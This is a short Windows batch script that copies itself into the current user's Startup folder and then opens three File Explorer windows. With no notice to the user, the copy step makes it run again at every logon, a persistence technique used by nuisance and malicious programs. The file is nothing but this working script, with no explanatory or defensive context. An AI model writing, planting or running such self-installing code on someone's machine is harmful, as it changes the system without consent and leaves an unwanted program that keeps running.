@echo off
set AUTOSTART=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
copy "%~f0" "%AUTOSTART%\%~nx0"

start explorer
start explorer
start explorer

pause
